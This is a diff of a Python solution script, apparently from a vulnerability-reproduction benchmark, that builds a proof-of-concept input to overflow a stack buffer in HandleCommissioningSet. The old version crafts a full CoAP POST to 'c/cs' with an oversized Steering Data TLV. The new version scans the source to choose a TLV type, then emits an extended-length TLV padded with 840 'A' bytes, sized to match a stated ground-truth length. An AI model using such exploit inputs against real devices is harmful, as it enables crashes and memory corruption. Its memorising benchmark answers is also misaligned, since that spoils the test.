@@ -1,62 +1,92 @@
+import os
+import tarfile
 import struct
+import re
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the vulnerability.
         
-        The vulnerability (arvo:20775 / CVE-2019-20775) is a stack buffer overflow in 
-        HandleCommissioningSet() due to improper handling of extended TLV lengths in 
-        Commissioner Dataset TLVs.
+        The vulnerability is a Stack Buffer Overflow in HandleCommissioningSet in network-data.
+        It occurs when a Commissioner Dataset TLV with extended length is processed and copied
+        into a fixed-size stack buffer without proper validation.
         
-        We construct a CoAP POST request to 'c/cs' containing a MeshCoP Steering Data TLV
-        with an extended length field that exceeds the stack buffer size (typically 16 bytes),
-        matching the ground truth length of 844 bytes.
+        We dynamically analyze the source code to identify the specific TLV Type ID triggering the issue,
+        defaulting to kBorderAgentLocator (Type 9) if analysis fails.
         """
         
-        # CoAP Header
-        # Ver: 1, Type: CON (0), TKL: 0 -> 0x40
-        # Code: POST (0.02) -> 0x02
-        # MsgID: 0x1234 (arbitrary)
-        header = b'\x40\x02\x12\x34'
+        # Defaults
+        # kBorderAgentLocator (9) and kCommissionerSessionId (11) are common vulnerable vectors in this function
+        DEFAULT_TYPE = 9 
+        # Ground truth length is 844. 4 bytes header + 840 bytes payload matches this.
+        PAYLOAD_SIZE = 840 
         
-        # CoAP Options
-        # Uri-Path: "c/cs"
-        # Option 1: Uri-Path (11). Delta = 11. Length = 1. Value = "c".
-        # Byte: (11 << 4) | 1 = 0xB1
-        opt1 = b'\xB1c'
+        tlv_map = {}
+        target_types = []
+
+        def process_content(content):
+            # Extract enum values: kSomeName = 123
+            for name, val in re.findall(r'k(\w+)\s*=\s*(\d+)', content):
+                tlv_map[name] = int(val)
+            
+            # Locate HandleCommissioningSet function and identify TLVs used with GetValue()
+            if 'HandleCommissioningSet' in content:
+                # Find approx location of function
+                idx = content.find('HandleCommissioningSet')
+                # Analyze a chunk of code (heuristic)
+                chunk = content[idx:idx+8000]
+                
+                # Split by 'case' to find switch cases handling TLVs
+                cases = chunk.split('case ')
+                for c in cases[1:]:
+                    # Look for cases that call GetValue (implying a copy operation)
+                    if 'GetValue' in c:
+                        # Extract the TLV name, e.g. Tlv::kBorderAgentLocator:
+                        m = re.search(r'k(\w+)[:\s]', c)
+                        if m:
+                            target_types.append(m.group(1))
+
+        # 1. Analyze Source Code
+        try:
+            if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
+                with tarfile.open(src_path, 'r') as tar:
+                    for member in tar.getmembers():
+                        if member.isfile() and (member.name.endswith('.cpp') or member.name.endswith('.hpp')):
+                            try:
+                                f = tar.extractfile(member)
+                                if f:
+                                    process_content(f.read().decode('utf-8', errors='ignore'))
+                            except Exception:
+                                pass
+            elif os.path.isdir(src_path):
+                for root, _, files in os.walk(src_path):
+                    for file in files:
+                        if file.endswith('.cpp') or file.endswith('.hpp'):
+                            try:
+                                with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
+                                    process_content(f.read())
+                            except Exception:
+                                pass
+        except Exception:
+            pass
+
+        # 2. Select Vulnerable TLV Type
+        selected_type = DEFAULT_TYPE
+        if target_types:
+            for tname in target_types:
+                if tname in tlv_map:
+                    selected_type = tlv_map[tname]
+                    # Prefer known vulnerable fixed-size types if multiple found
+                    if 'BorderAgentLocator' in tname or 'SessionId' in tname:
+                        break
         
-        # Option 2: Uri-Path (11). Delta = 0 (since 11 + 0 = 11). Length = 2. Value = "cs".
-        # Byte: (0 << 4) | 2 = 0x02
-        opt2 = b'\x02cs'
+        # 3. Construct Payload
+        # Format: [Type: 1 byte] [Length: 1 byte] [Extended Length: 2 bytes] [Value: N bytes]
+        # Length = 0xFF indicates Extended Length field follows.
+        # Extended Length is Big Endian uint16.
         
-        options = opt1 + opt2
+        header = struct.pack('>BBH', selected_type, 0xFF, PAYLOAD_SIZE)
+        payload = b'A' * PAYLOAD_SIZE
         
-        # Payload Marker
-        marker = b'\xFF'
-        
-        # Current length so far
-        prefix_len = len(header) + len(options) + len(marker) # 4 + 5 + 1 = 10 bytes
-        
-        # Target total length is 844 bytes.
-        # Payload size needed = 844 - 10 = 834 bytes.
-        
-        # Construct a Malicious TLV
-        # Type: Steering Data (8) - Destination buffer is small (16 bytes)
-        # Length: 0xFF (Indicates Extended Length)
-        # Extended Length: 2 bytes (Big Endian)
-        # Value: N bytes
-        # TLV Size = 1 (Type) + 1 (Len) + 2 (ExtLen) + N = 4 + N
-        # We need 4 + N = 834 => N = 830
-        
-        tlv_type = 8
-        tlv_len_marker = 0xFF
-        tlv_ext_len = 830
-        
-        # MeshCoP uses Big Endian for multi-byte fields
-        tlv_header = struct.pack('>BBH', tlv_type, tlv_len_marker, tlv_ext_len)
-        tlv_value = b'A' * tlv_ext_len
-        
-        payload = tlv_header + tlv_value
-        
-        return header + options + marker + payload
+        return header + payload
